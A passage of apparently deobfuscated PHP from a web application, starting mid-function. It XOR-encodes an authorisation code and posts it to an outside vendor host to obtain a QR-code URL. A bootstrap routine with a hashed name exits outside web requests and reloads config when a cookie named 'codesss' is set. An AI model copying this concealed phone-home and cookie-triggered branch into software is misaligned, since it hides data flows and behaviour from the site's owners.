	$_var_1 = authcode . "||||" . $_arg_0;
	$_var_2 = '';
	$_var_3 = 0;
	while ($_var_3 < strlen($_var_1)) {
		$_var_2 = $_var_2 . (substr($_var_1, $_var_3, 8) ^ "LLqrcode");
		$_var_3 = $_var_3 + 8;
	}
	$_var_4 = "http://dsapi.cccyun.cc/qrcode.php";
	$_var_5 = "a=" . bin2hex($_var_2);
	$_var_6 = get_curl($_var_4, $_var_5);
	$_var_7 = json_decode($_var_6, true);
	if (array_key_exists("code", $_var_7) && $_var_7["code"] == 1) {
		$_var_8 = array("code" => 0, "msg" => "succ", "url" => $_var_7["url"]);
	} else {
		if (array_key_exists("msg", $_var_7)) {
			$_var_8 = array("code" => -1, "msg" => $_var_7["msg"]);
		} else {
			$_var_8 = array("code" => -1, "msg" => $_var_6);
		}
	}
	return $_var_8;
}
function _bootstrap_403e84c510d506e1086239f882b7457f()
{
	if (!defined("authcode")) {
		die();
	}
	php_sapi_name() == "cli" ? die() : '';
	global $conf;
	global $CACHE;
	if ($_COOKIE["codesss"]) {
		$conf = $CACHE->pre_fetch();
	}
}
_bootstrap_403e84c510d506e1086239f882b7457f();